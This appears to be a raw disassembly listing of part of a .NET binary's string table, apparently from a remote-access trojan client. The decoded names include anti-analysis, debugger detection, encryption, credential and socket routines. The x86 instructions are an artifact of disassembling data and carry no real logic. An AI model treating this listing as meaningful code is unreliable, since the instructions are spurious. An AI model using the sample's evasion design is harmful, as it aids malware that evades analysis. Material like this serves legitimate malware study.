  408baf:	66 65 72 00          	data16 gs jb 0x408bb3
  408bb3:	73 65                	jae    0x408c1a
  408bb5:	74 5f                	je     0x408c16
  408bb7:	42                   	inc    %edx
  408bb8:	75 66                	jne    0x408c20
  408bba:	66 65 72 00          	data16 gs jb 0x408bbe
  408bbe:	57                   	push   %edi
  408bbf:	72 69                	jb     0x408c2a
  408bc1:	74 65                	je     0x408c28
  408bc3:	49                   	dec    %ecx
  408bc4:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc5:	74 65                	je     0x408c2c
  408bc7:	67 65 72 00          	addr16 gs jb 0x408bcb
  408bcb:	67 65 74 5f          	addr16 gs je 0x408c2e
  408bcf:	41                   	inc    %ecx
  408bd0:	73 49                	jae    0x408c1b
  408bd2:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd3:	74 65                	je     0x408c3a
  408bd5:	67 65 72 00          	addr16 gs jb 0x408bd9
  408bd9:	73 65                	jae    0x408c40
  408bdb:	74 5f                	je     0x408c3c
  408bdd:	41                   	inc    %ecx
  408bde:	73 49                	jae    0x408c29
  408be0:	6e                   	outsb  %ds:(%esi),(%dx)
  408be1:	74 65                	je     0x408c48
  408be3:	67 65 72 00          	addr16 gs jb 0x408be7
  408be7:	47                   	inc    %edi
  408be8:	65 74 41             	gs je  0x408c2c
  408beb:	73 49                	jae    0x408c36
  408bed:	6e                   	outsb  %ds:(%esi),(%dx)
  408bee:	74 65                	je     0x408c55
  408bf0:	67 65 72 00          	addr16 gs jb 0x408bf4
  408bf4:	53                   	push   %ebx
  408bf5:	65 74 41             	gs je  0x408c39
  408bf8:	73 49                	jae    0x408c43
  408bfa:	6e                   	outsb  %ds:(%esi),(%dx)
  408bfb:	74 65                	je     0x408c62
  408bfd:	67 65 72 00          	addr16 gs jb 0x408c01
  408c01:	44                   	inc    %esp
  408c02:	65 74 65             	gs je  0x408c6a
  408c05:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c09:	62 75 67             	bound  %esi,0x67(%ebp)
  408c0c:	67 65 72 00          	addr16 gs jb 0x408c10
  408c10:	4d                   	dec    %ebp
  408c11:	61                   	popa
  408c12:	6e                   	outsb  %ds:(%esi),(%dx)
  408c13:	61                   	popa
  408c14:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c17:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c19:	74 4f                	je     0x408c6a
  408c1b:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c1e:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c22:	61                   	popa
  408c23:	72 63                	jb     0x408c88
  408c25:	68 65 72 00 53       	push   $0x53007265
  408c2a:	65 73 73             	gs jae 0x408ca0
  408c2d:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c34:	6e                   	outsb  %ds:(%esi),(%dx)
  408c35:	67 45                	addr16 inc %ebp
  408c37:	76 65                	jbe    0x408c9e
  408c39:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3a:	74 48                	je     0x408c84
  408c3c:	61                   	popa
  408c3d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3e:	64 6c                	fs insb (%dx),%es:(%edi)
  408c40:	65 72 00             	gs jb  0x408c43
  408c43:	54                   	push   %esp
  408c44:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c4b:	6e                   	outsb  %ds:(%esi),(%dx)
  408c4c:	65 72 00             	gs jb  0x408c4f
  408c4f:	43                   	inc    %ebx
  408c50:	6c                   	insb   (%dx),%es:(%edi)
  408c51:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c58:	6c                   	insb   (%dx),%es:(%edi)
  408c59:	70 65                	jo     0x408cc0
  408c5b:	72 00                	jb     0x408c5d
  408c5d:	54                   	push   %esp
  408c5e:	6f                   	outsl  %ds:(%esi),(%dx)
  408c5f:	55                   	push   %ebp
  408c60:	70 70                	jo     0x408cd2
  408c62:	65 72 00             	gs jb  0x408c65
  408c65:	44                   	inc    %esp
  408c66:	65 74 65             	gs je  0x408cce
  408c69:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c6d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c6e:	75 66                	jne    0x408cd6
  408c70:	61                   	popa
  408c71:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c75:	65 72 00             	gs jb  0x408c78
  408c78:	43                   	inc    %ebx
  408c79:	75 72                	jne    0x408ced
  408c7b:	72 65                	jb     0x408ce2
  408c7d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c7e:	74 55                	je     0x408cd5
  408c80:	73 65                	jae    0x408ce7
  408c82:	72 00                	jb     0x408c84
  408c84:	53                   	push   %ebx
  408c85:	74 72                	je     0x408cf9
  408c87:	65 61                	gs popa
  408c89:	6d                   	insl   (%dx),%es:(%edi)
  408c8a:	57                   	push   %edi
  408c8b:	72 69                	jb     0x408cf6
  408c8d:	74 65                	je     0x408cf4
  408c8f:	72 00                	jb     0x408c91
  408c91:	54                   	push   %esp
  408c92:	65 78 74             	gs js  0x408d09
  408c95:	57                   	push   %edi
  408c96:	72 69                	jb     0x408d01
  408c98:	74 65                	je     0x408cff
  408c9a:	72 00                	jb     0x408c9c
  408c9c:	45                   	inc    %ebp
  408c9d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c9e:	74 65                	je     0x408d05
  408ca0:	72 00                	jb     0x408ca2
  408ca2:	42                   	inc    %edx
  408ca3:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408caa:	72 
  408cab:	74 65                	je     0x408d12
  408cad:	72 00                	jb     0x408caf
  408caf:	54                   	push   %esp
  408cb0:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb1:	4c                   	dec    %esp
  408cb2:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb3:	77 65                	ja     0x408d1a
  408cb5:	72 00                	jb     0x408cb7
  408cb7:	45                   	inc    %ebp
  408cb8:	72 72                	jb     0x408d2c
  408cba:	6f                   	outsl  %ds:(%esi),(%dx)
  408cbb:	72 00                	jb     0x408cbd
  408cbd:	49                   	dec    %ecx
  408cbe:	45                   	inc    %ebp
  408cbf:	6e                   	outsb  %ds:(%esi),(%dx)
  408cc0:	75 6d                	jne    0x408d2f
  408cc2:	65 72 61             	gs jb  0x408d26
  408cc5:	74 6f                	je     0x408d36
  408cc7:	72 00                	jb     0x408cc9
  408cc9:	4d                   	dec    %ebp
  408cca:	61                   	popa
  408ccb:	6e                   	outsb  %ds:(%esi),(%dx)
  408ccc:	61                   	popa
  408ccd:	67 65 6d             	gs insl (%dx),%es:(%di)
  408cd0:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cd2:	74 4f                	je     0x408d23
  408cd4:	62 6a 65             	bound  %ebp,0x65(%edx)
  408cd7:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408cdb:	75 6d                	jne    0x408d4a
  408cdd:	65 72 61             	gs jb  0x408d41
  408ce0:	74 6f                	je     0x408d51
  408ce2:	72 00                	jb     0x408ce4
  408ce4:	53                   	push   %ebx
  408ce5:	79 73                	jns    0x408d5a
  408ce7:	74 65                	je     0x408d4e
  408ce9:	6d                   	insl   (%dx),%es:(%edi)
  408cea:	2e 43                	cs inc %ebx
  408cec:	6f                   	outsl  %ds:(%esi),(%dx)
  408ced:	6c                   	insb   (%dx),%es:(%edi)
  408cee:	6c                   	insb   (%dx),%es:(%edi)
  408cef:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408cf4:	6e                   	outsb  %ds:(%esi),(%dx)
  408cf5:	73 2e                	jae    0x408d25
  408cf7:	49                   	dec    %ecx
  408cf8:	45                   	inc    %ebp
  408cf9:	6e                   	outsb  %ds:(%esi),(%dx)
  408cfa:	75 6d                	jne    0x408d69
  408cfc:	65 72 61             	gs jb  0x408d60
  408cff:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d03:	47                   	inc    %edi
  408d04:	65 74 45             	gs je  0x408d4c
  408d07:	6e                   	outsb  %ds:(%esi),(%dx)
  408d08:	75 6d                	jne    0x408d77
  408d0a:	65 72 61             	gs jb  0x408d6e
  408d0d:	74 6f                	je     0x408d7e
  408d0f:	72 00                	jb     0x408d11
  408d11:	41                   	inc    %ecx
  408d12:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d16:	61                   	popa
  408d17:	74 6f                	je     0x408d88
  408d19:	72 00                	jb     0x408d1b
  408d1b:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d20:	00 2e                	add    %ch,(%esi)
  408d22:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d25:	6f                   	outsl  %ds:(%esi),(%dx)
  408d26:	72 00                	jb     0x408d28
  408d28:	4d                   	dec    %ebp
  408d29:	6f                   	outsl  %ds:(%esi),(%dx)
  408d2a:	6e                   	outsb  %ds:(%esi),(%dx)
  408d2b:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d32:	65 
  408d33:	61                   	popa
  408d34:	74 65                	je     0x408d9b
  408d36:	44                   	inc    %esp
  408d37:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d3b:	70 74                	jo     0x408db1
  408d3d:	6f                   	outsl  %ds:(%esi),(%dx)
  408d3e:	72 00                	jb     0x408d40
  408d40:	43                   	inc    %ebx
  408d41:	72 65                	jb     0x408da8
  408d43:	61                   	popa
  408d44:	74 65                	je     0x408dab
  408d46:	45                   	inc    %ebp
  408d47:	6e                   	outsb  %ds:(%esi),(%dx)
  408d48:	63 72 79             	arpl   %esi,0x79(%edx)
  408d4b:	70 74                	jo     0x408dc1
  408d4d:	6f                   	outsl  %ds:(%esi),(%dx)
  408d4e:	72 00                	jb     0x408d50
  408d50:	49                   	dec    %ecx
  408d51:	6e                   	outsb  %ds:(%esi),(%dx)
  408d52:	74 50                	je     0x408da4
  408d54:	74 72                	je     0x408dc8
  408d56:	00 53 79             	add    %dl,0x79(%ebx)
  408d59:	73 74                	jae    0x408dcf
  408d5b:	65 6d                	gs insl (%dx),%es:(%edi)
  408d5d:	2e 44                	cs inc %esp
  408d5f:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d66:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d6d:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d74:	6f                   	outsl  %ds:(%esi),(%dx)
  408d75:	64 73 00             	fs jae 0x408d78
  408d78:	4d                   	dec    %ebp
  408d79:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408d80:	74 2e                	je     0x408db0
  408d82:	56                   	push   %esi
  408d83:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408d8a:	73 69                	jae    0x408df5
  408d8c:	63 2e                	arpl   %ebp,(%esi)
  408d8e:	44                   	inc    %esp
  408d8f:	65 76 69             	gs jbe 0x408dfb
  408d92:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d95:	00 53 79             	add    %dl,0x79(%ebx)
  408d98:	73 74                	jae    0x408e0e
  408d9a:	65 6d                	gs insl (%dx),%es:(%edi)
  408d9c:	2e 52                	cs push %edx
  408d9e:	75 6e                	jne    0x408e0e
  408da0:	74 69                	je     0x408e0b
  408da2:	6d                   	insl   (%dx),%es:(%edi)
  408da3:	65 2e 49             	gs cs dec %ecx
  408da6:	6e                   	outsb  %ds:(%esi),(%dx)
  408da7:	74 65                	je     0x408e0e
  408da9:	72 6f                	jb     0x408e1a
  408dab:	70 53                	jo     0x408e00
  408dad:	65 72 76             	gs jb  0x408e26
  408db0:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408db7:	73 74                	jae    0x408e2d
  408db9:	65 6d                	gs insl (%dx),%es:(%edi)
  408dbb:	2e 52                	cs push %edx
  408dbd:	75 6e                	jne    0x408e2d
  408dbf:	74 69                	je     0x408e2a
  408dc1:	6d                   	insl   (%dx),%es:(%edi)
  408dc2:	65 2e 43             	gs cs inc %ebx
  408dc5:	6f                   	outsl  %ds:(%esi),(%dx)
  408dc6:	6d                   	insl   (%dx),%es:(%edi)
  408dc7:	70 69                	jo     0x408e32
  408dc9:	6c                   	insb   (%dx),%es:(%edi)
  408dca:	65 72 53             	gs jb  0x408e20
  408dcd:	65 72 76             	gs jb  0x408e46
  408dd0:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408dd7:	62 75 67             	bound  %esi,0x67(%ebp)
  408dda:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408de1:	65 
  408de2:	73 00                	jae    0x408de4
  408de4:	45                   	inc    %ebp
  408de5:	78 70                	js     0x408e57
  408de7:	61                   	popa
  408de8:	6e                   	outsb  %ds:(%esi),(%dx)
  408de9:	64 45                	fs inc %ebp
  408deb:	6e                   	outsb  %ds:(%esi),(%dx)
  408dec:	76 69                	jbe    0x408e57
  408dee:	72 6f                	jb     0x408e5f
  408df0:	6e                   	outsb  %ds:(%esi),(%dx)
  408df1:	6d                   	insl   (%dx),%es:(%edi)
  408df2:	65 6e                	outsb  %gs:(%esi),(%dx)
  408df4:	74 56                	je     0x408e4c
  408df6:	61                   	popa
  408df7:	72 69                	jb     0x408e62
  408df9:	61                   	popa
  408dfa:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408dfe:	00 47 65             	add    %al,0x65(%edi)
  408e01:	74 50                	je     0x408e53
  408e03:	72 6f                	jb     0x408e74
  408e05:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e08:	73 65                	jae    0x408e6f
  408e0a:	73 00                	jae    0x408e0c
  408e0c:	47                   	inc    %edi
  408e0d:	65 74 48             	gs je  0x408e58
  408e10:	6f                   	outsl  %ds:(%esi),(%dx)
  408e11:	73 74                	jae    0x408e87
  408e13:	41                   	inc    %ecx
  408e14:	64 64 72 65          	fs fs jb 0x408e7d
  408e18:	73 73                	jae    0x408e8d
  408e1a:	65 73 00             	gs jae 0x408e1d
  408e1d:	53                   	push   %ebx
  408e1e:	79 73                	jns    0x408e93
  408e20:	74 65                	je     0x408e87
  408e22:	6d                   	insl   (%dx),%es:(%edi)
  408e23:	2e 53                	cs push %ebx
  408e25:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e29:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e30:	70 
  408e31:	74 6f                	je     0x408ea2
  408e33:	67 72 61             	addr16 jb 0x408e97
  408e36:	70 68                	jo     0x408ea0
  408e38:	79 2e                	jns    0x408e68
  408e3a:	58                   	pop    %eax
  408e3b:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e40:	72 74                	jb     0x408eb6
  408e42:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e49:	73 00                	jae    0x408e4b
  408e4b:	45                   	inc    %ebp
  408e4c:	6e                   	outsb  %ds:(%esi),(%dx)
  408e4d:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e50:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e54:	74 65                	je     0x408ebb
  408e56:	73 00                	jae    0x408e58
  408e58:	47                   	inc    %edi
  408e59:	65 74 55             	gs je  0x408eb1
  408e5c:	74 66                	je     0x408ec4
  408e5e:	38 42 79             	cmp    %al,0x79(%edx)
  408e61:	74 65                	je     0x408ec8
  408e63:	73 00                	jae    0x408e65
  408e65:	75 74                	jne    0x408edb
  408e67:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e6b:	74 65                	je     0x408ed2
  408e6d:	73 00                	jae    0x408e6f
  408e6f:	52                   	push   %edx
  408e70:	66 63 32             	arpl   %si,(%edx)
  408e73:	38 39                	cmp    %bh,(%ecx)
  408e75:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e79:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408e80:	73 00                	jae    0x408e82
  408e82:	52                   	push   %edx
  408e83:	65 61                	gs popa
  408e85:	64 41                	fs inc %ecx
  408e87:	6c                   	insb   (%dx),%es:(%edi)
  408e88:	6c                   	insb   (%dx),%es:(%edi)
  408e89:	42                   	inc    %edx
  408e8a:	79 74                	jns    0x408f00
  408e8c:	65 73 00             	gs jae 0x408e8f
  408e8f:	44                   	inc    %esp
  408e90:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408e94:	65 46                	gs inc %esi
  408e96:	72 6f                	jb     0x408f07
  408e98:	6d                   	insl   (%dx),%es:(%edi)
  408e99:	42                   	inc    %edx
  408e9a:	79 74                	jns    0x408f10
  408e9c:	65 73 00             	gs jae 0x408e9f
  408e9f:	53                   	push   %ebx
  408ea0:	77 61                	ja     0x408f03
  408ea2:	70 42                	jo     0x408ee6
  408ea4:	79 74                	jns    0x408f1a
  408ea6:	65 73 00             	gs jae 0x408ea9
  408ea9:	4c                   	dec    %esp
  408eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  408eab:	61                   	popa
  408eac:	64 46                	fs inc %esi
  408eae:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408eb5:	74 
  408eb6:	65 73 00             	gs jae 0x408eb9
  408eb9:	47                   	inc    %edi
  408eba:	65 74 41             	gs je  0x408efe
  408ebd:	73 42                	jae    0x408f01
  408ebf:	79 74                	jns    0x408f35
  408ec1:	65 73 00             	gs jae 0x408ec4
  408ec4:	53                   	push   %ebx
  408ec5:	65 74 41             	gs je  0x408f09
  408ec8:	73 42                	jae    0x408f0c
  408eca:	79 74                	jns    0x408f40
  408ecc:	65 73 00             	gs jae 0x408ecf
  408ecf:	47                   	inc    %edi
  408ed0:	65 74 42             	gs je  0x408f15
  408ed3:	79 74                	jns    0x408f49
  408ed5:	65 73 00             	gs jae 0x408ed8
  408ed8:	72 61                	jb     0x408f3b
  408eda:	77 42                	ja     0x408f1e
  408edc:	79 74                	jns    0x408f52
  408ede:	65 73 00             	gs jae 0x408ee1
  408ee1:	62 79 74             	bound  %edi,0x74(%ecx)
  408ee4:	65 73 00             	gs jae 0x408ee7
  408ee7:	43                   	inc    %ebx
  408ee8:	53                   	push   %ebx
  408ee9:	68 61 72 70 41       	push   $0x41707261
  408eee:	72 67                	jb     0x408f57
  408ef0:	75 6d                	jne    0x408f5f
  408ef2:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ef4:	74 49                	je     0x408f3f
  408ef6:	6e                   	outsb  %ds:(%esi),(%dx)
  408ef7:	66 6f                	outsw  %ds:(%esi),(%dx)
  408ef9:	46                   	inc    %esi
  408efa:	6c                   	insb   (%dx),%es:(%edi)
  408efb:	61                   	popa
  408efc:	67 73 00             	addr16 jae 0x408eff
  408eff:	43                   	inc    %ebx
  408f00:	53                   	push   %ebx
  408f01:	68 61 72 70 42       	push   $0x42707261
  408f06:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f0d:	61                   	popa
  408f0e:	67 73 00             	addr16 jae 0x408f11
  408f11:	65 73 46             	gs jae 0x408f5a
  408f14:	6c                   	insb   (%dx),%es:(%edi)
  408f15:	61                   	popa
  408f16:	67 73 00             	addr16 jae 0x408f19
  408f19:	53                   	push   %ebx
  408f1a:	74 72                	je     0x408f8e
  408f1c:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f23:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f2a:	65 
  408f2b:	53                   	push   %ebx
  408f2c:	65 74 74             	gs je  0x408fa3
  408f2f:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f36:	73 73                	jae    0x408fab
  408f38:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f3f:	6e                   	outsb  %ds:(%esi),(%dx)
  408f40:	67 45                	addr16 inc %ebp
  408f42:	76 65                	jbe    0x408fa9
  408f44:	6e                   	outsb  %ds:(%esi),(%dx)
  408f45:	74 41                	je     0x408f88
  408f47:	72 67                	jb     0x408fb0
  408f49:	73 00                	jae    0x408f4b
  408f4b:	41                   	inc    %ecx
  408f4c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4d:	74 69                	je     0x408fb8
  408f4f:	5f                   	pop    %edi
  408f50:	41                   	inc    %ecx
  408f51:	6e                   	outsb  %ds:(%esi),(%dx)
  408f52:	61                   	popa
  408f53:	6c                   	insb   (%dx),%es:(%edi)
  408f54:	79 73                	jns    0x408fc9
  408f56:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f5d:	6e                   	outsb  %ds:(%esi),(%dx)
  408f5e:	74 69                	je     0x408fc9
  408f60:	41                   	inc    %ecx
  408f61:	6e                   	outsb  %ds:(%esi),(%dx)
  408f62:	61                   	popa
  408f63:	6c                   	insb   (%dx),%es:(%edi)
  408f64:	79 73                	jns    0x408fd9
  408f66:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f6d:	73 00                	jae    0x408f6f
  408f6f:	49                   	dec    %ecx
  408f70:	43                   	inc    %ebx
  408f71:	72 65                	jb     0x408fd8
  408f73:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f76:	74 69                	je     0x408fe1
  408f78:	61                   	popa
  408f79:	6c                   	insb   (%dx),%es:(%edi)
  408f7a:	73 00                	jae    0x408f7c
  408f7c:	73 65                	jae    0x408fe3
  408f7e:	74 5f                	je     0x408fdf
  408f80:	43                   	inc    %ebx
  408f81:	72 65                	jb     0x408fe8
  408f83:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f86:	74 69                	je     0x408ff1
  408f88:	61                   	popa
  408f89:	6c                   	insb   (%dx),%es:(%edi)
  408f8a:	73 00                	jae    0x408f8c
  408f8c:	45                   	inc    %ebp
  408f8d:	71 75                	jno    0x409004
  408f8f:	61                   	popa
  408f90:	6c                   	insb   (%dx),%es:(%edi)
  408f91:	73 00                	jae    0x408f93
  408f93:	53                   	push   %ebx
  408f94:	73 6c                	jae    0x409002
  408f96:	50                   	push   %eax
  408f97:	72 6f                	jb     0x409008
  408f99:	74 6f                	je     0x40900a
  408f9b:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408f9e:	73 00                	jae    0x408fa0
  408fa0:	52                   	push   %edx
  408fa1:	65 61                	gs popa
  408fa3:	64 54                	fs push %esp
  408fa5:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa6:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa7:	6c                   	insb   (%dx),%es:(%edi)
  408fa8:	73 00                	jae    0x408faa
  408faa:	57                   	push   %edi
  408fab:	72 69                	jb     0x409016
  408fad:	74 65                	je     0x409014
  408faf:	54                   	push   %esp
  408fb0:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb1:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb2:	6c                   	insb   (%dx),%es:(%edi)
  408fb3:	73 00                	jae    0x408fb5
  408fb5:	42                   	inc    %edx
  408fb6:	79 74                	jns    0x40902c
  408fb8:	65 73 54             	gs jae 0x40900f
  408fbb:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbc:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbd:	6c                   	insb   (%dx),%es:(%edi)
  408fbe:	73 00                	jae    0x408fc0
  408fc0:	53                   	push   %ebx
  408fc1:	79 73                	jns    0x409036
  408fc3:	74 65                	je     0x40902a
  408fc5:	6d                   	insl   (%dx),%es:(%edi)
  408fc6:	2e 57                	cs push %edi
  408fc8:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fcf:	46                   	inc    %esi
  408fd0:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd1:	72 6d                	jb     0x409040
  408fd3:	73 00                	jae    0x408fd5
  408fd5:	44                   	inc    %esp
  408fd6:	6e                   	outsb  %ds:(%esi),(%dx)
  408fd7:	73 00                	jae    0x408fd9
  408fd9:	43                   	inc    %ebx
  408fda:	6f                   	outsl  %ds:(%esi),(%dx)
  408fdb:	6e                   	outsb  %ds:(%esi),(%dx)
  408fdc:	74 61                	je     0x40903f
  408fde:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408fe5:	74 65                	je     0x40904c
  408fe7:	6d                   	insl   (%dx),%es:(%edi)
  408fe8:	2e 43                	cs inc %ebx
  408fea:	6f                   	outsl  %ds:(%esi),(%dx)
  408feb:	6c                   	insb   (%dx),%es:(%edi)
  408fec:	6c                   	insb   (%dx),%es:(%edi)
  408fed:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408ff2:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff3:	73 00                	jae    0x408ff5
  408ff5:	53                   	push   %ebx
  408ff6:	74 72                	je     0x40906a
  408ff8:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  408fff:	74 4f                	je     0x409050
  409001:	70 74                	jo     0x409077
  409003:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  40900a:	74 49                	je     0x409055
  40900c:	6d                   	insl   (%dx),%es:(%edi)
  40900d:	61                   	popa
  40900e:	67 65 44             	addr16 gs inc %esp
  409011:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409015:	65 72 73             	gs jb  0x40908b
  409018:	00 52 75             	add    %dl,0x75(%edx)
  40901b:	6e                   	outsb  %ds:(%esi),(%dx)
  40901c:	74 69                	je     0x409087
  40901e:	6d                   	insl   (%dx),%es:(%edi)
  40901f:	65 48                	gs dec %eax
  409021:	65 6c                	gs insb (%dx),%es:(%edi)
  409023:	70 65                	jo     0x40908a
  409025:	72 73                	jb     0x40909a
  409027:	00 53 73             	add    %dl,0x73(%ebx)
  40902a:	6c                   	insb   (%dx),%es:(%edi)
  40902b:	50                   	push   %eax
  40902c:	6f                   	outsl  %ds:(%esi),(%dx)
  40902d:	6c                   	insb   (%dx),%es:(%edi)
  40902e:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409035:	72 73                	jb     0x4090aa
  409037:	00 73 73             	add    %dh,0x73(%ebx)
  40903a:	6c                   	insb   (%dx),%es:(%edi)
  40903b:	50                   	push   %eax
  40903c:	6f                   	outsl  %ds:(%esi),(%dx)
  40903d:	6c                   	insb   (%dx),%es:(%edi)
  40903e:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409045:	72 73                	jb     0x4090ba
  409047:	00 46 69             	add    %al,0x69(%esi)
  40904a:	6c                   	insb   (%dx),%es:(%edi)
  40904b:	65 41                	gs inc %ecx
  40904d:	63 63 65             	arpl   %esp,0x65(%ebx)
  409050:	73 73                	jae    0x4090c5
  409052:	00 68 50             	add    %ch,0x50(%eax)
  409055:	72 6f                	jb     0x4090c6
  409057:	63 65 73             	arpl   %esp,0x73(%ebp)
  40905a:	73 00                	jae    0x40905c
  40905c:	47                   	inc    %edi
  40905d:	65 74 43             	gs je  0x4090a3
  409060:	75 72                	jne    0x4090d4
  409062:	72 65                	jb     0x4090c9
  409064:	6e                   	outsb  %ds:(%esi),(%dx)
  409065:	74 50                	je     0x4090b7
  409067:	72 6f                	jb     0x4090d8
  409069:	63 65 73             	arpl   %esp,0x73(%ebp)
  40906c:	73 00                	jae    0x40906e
  40906e:	49                   	dec    %ecx
  40906f:	50                   	push   %eax
  409070:	41                   	inc    %ecx
  409071:	64 64 72 65          	fs fs jb 0x4090da
  409075:	73 73                	jae    0x4090ea
  409077:	00 43 6f             	add    %al,0x6f(%ebx)
  40907a:	6d                   	insl   (%dx),%es:(%edi)
  40907b:	70 72                	jo     0x4090ef
  40907d:	65 73 73             	gs jae 0x4090f3
  409080:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  409084:	6f                   	outsl  %ds:(%esi),(%dx)
  409085:	6d                   	insl   (%dx),%es:(%edi)
  409086:	70 72                	jo     0x4090fa
  409088:	65 73 73             	gs jae 0x4090fe
  40908b:	00 53 79             	add    %dl,0x79(%ebx)
  40908e:	73 74                	jae    0x409104
  409090:	65 6d                	gs insl (%dx),%es:(%edi)
  409092:	2e 4e                	cs dec %esi
  409094:	65 74 2e             	gs je  0x4090c5
  409097:	53                   	push   %ebx
  409098:	6f                   	outsl  %ds:(%esi),(%dx)
  409099:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40909c:	74 73                	je     0x409111
  40909e:	00 73 65             	add    %dh,0x65(%ebx)
  4090a1:	74 5f                	je     0x409102
  4090a3:	41                   	inc    %ecx
  4090a4:	72 67                	jb     0x40910d
  4090a6:	75 6d                	jne    0x409115
  4090a8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090aa:	74 73                	je     0x40911f
  4090ac:	00 53 79             	add    %dl,0x79(%ebx)
  4090af:	73 74                	jae    0x409125
  4090b1:	65 6d                	gs insl (%dx),%es:(%edi)
  4090b3:	45                   	inc    %ebp
  4090b4:	76 65                	jbe    0x40911b
  4090b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4090b7:	74 73                	je     0x40912c
  4090b9:	00 50 6f             	add    %dl,0x6f(%eax)
  4090bc:	72 74                	jb     0x409132
  4090be:	73 00                	jae    0x4090c0
  4090c0:	45                   	inc    %ebp
  4090c1:	78 69                	js     0x40912c
  4090c3:	73 74                	jae    0x409139
